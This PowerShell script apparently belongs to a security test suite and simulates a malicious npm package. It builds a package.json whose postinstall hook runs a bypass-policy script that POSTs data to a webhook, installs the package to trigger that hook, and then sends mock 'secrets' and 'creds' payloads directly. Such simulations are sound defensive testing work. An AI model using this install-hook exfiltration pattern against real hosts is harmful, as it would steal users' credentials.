#Requires -Version 5.1
<#
.SYNOPSIS
    Scenario 1: Malicious Postinstall Script Execution
.DESCRIPTION
    Simulates a malicious package with postinstall script that exfiltrates data
#>

$WorkDir = "test-malicious-package"
$WebhookTarget = if ($env:MOCK_WEBHOOK) { $env:MOCK_WEBHOOK } else { "http://localhost:8080/webhook-receiver" }

# Clean up any existing test directory
if (Test-Path $WorkDir) {
    Remove-Item $WorkDir -Recurse -Force
}

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
Set-Location $WorkDir

Write-Host "Scenario 1: Creating malicious package with postinstall script" -ForegroundColor Yellow

# Create postinstall script
$postinstallScript = @"
try {
    `$response = Invoke-RestMethod -Uri "$WebhookTarget" -Method POST -Body @{test="postinstall_data"} -TimeoutSec 10
    Write-Host "Postinstall exfiltration successful"
} catch {
    Write-Host "Mock exfiltration attempt"
}
"@

$postinstallScript | Out-File -FilePath "postinstall.ps1" -Encoding UTF8

# Create package.json with malicious postinstall script
$packageJson = @{
    name = "test-evil-package"
    version = "1.0.0"
    scripts = @{
        postinstall = "powershell -ExecutionPolicy Bypass -File postinstall.ps1"
    }
    dependencies = @{}
} | ConvertTo-Json -Depth 10

$packageJson | Out-File -FilePath "package.json" -Encoding UTF8

Write-Host "Installing package to trigger postinstall..." -ForegroundColor Cyan

# Configure npm to reduce noise
try {
    npm config set fund false 2>$null
    npm config set audit false 2>$null
}
catch {
    # Ignore config errors
}

# Install to trigger postinstall
try {
    npm install 2>$null
}
catch {
    Write-Host "npm install completed (expected behavior)" -ForegroundColor Gray
}

Write-Host "Testing alternative exfiltration methods..." -ForegroundColor Cyan

# Initialize new package
try {
    npm init -y 2>$null | Out-Null
}
catch {
    # Ignore init errors
}

# Try installing a test package with timeout
$installJob = Start-Job -ScriptBlock {
    try {
        npm install --save test-package 2>$null
    }
    catch {
        # Expected to fail
    }
}

# Wait briefly then stop the job
Start-Sleep -Seconds 5
$installJob | Stop-Job -PassThru | Remove-Job -Force

# Direct HTTP POST simulation
try {
    $response = Invoke-RestMethod -Uri $WebhookTarget -Method POST -Body @{secrets="fake"} -TimeoutSec 10
    Write-Host "Direct HTTP POST successful" -ForegroundColor Green
}
catch {
    Write-Host "Direct HTTP POST failed (expected in some configurations)" -ForegroundColor Gray
}

# Test with alternative tools if available
if (Get-Command yarn -ErrorAction SilentlyContinue) {
    Write-Host "Testing with yarn..." -ForegroundColor Gray
    $yarnJob = Start-Job -ScriptBlock {
        try {
            yarn add test-package 2>$null
        }
        catch {
            # Expected to fail
        }
    }
    Start-Sleep -Seconds 5
    $yarnJob | Stop-Job -PassThru | Remove-Job -Force
}

# Test with Invoke-WebRequest as wget alternative
try {
    $null = Invoke-WebRequest -Uri $WebhookTarget -Method POST -Body "creds=test" -TimeoutSec 10
    Write-Host "PowerShell web request successful" -ForegroundColor Green
}
catch {
    Write-Host "PowerShell web request failed (expected in some configurations)" -ForegroundColor Gray
}

Set-Location ..
Write-Host "Scenario 1 complete" -ForegroundColor Green
